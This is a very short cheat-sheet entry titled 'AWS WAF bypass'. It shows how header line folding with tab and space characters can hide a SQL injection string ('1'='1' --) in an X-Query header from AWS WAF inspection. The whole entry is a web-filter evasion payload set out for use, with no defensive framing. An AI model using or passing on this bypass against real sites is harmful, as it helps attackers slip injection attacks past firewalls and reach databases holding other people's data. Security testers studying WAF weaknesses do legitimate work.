# AWS WAF bypass
```
AWS WAF bypass using \x09 (tab) and \x20 (space)
1337: Value\r\n\t1337 --> 1337: Value\t1337
X-Query: '1'='1' -- WAF

X-Query:
	\x09Injection(e.g.'1'='1' --)    Bypass(SQLi for example)
```
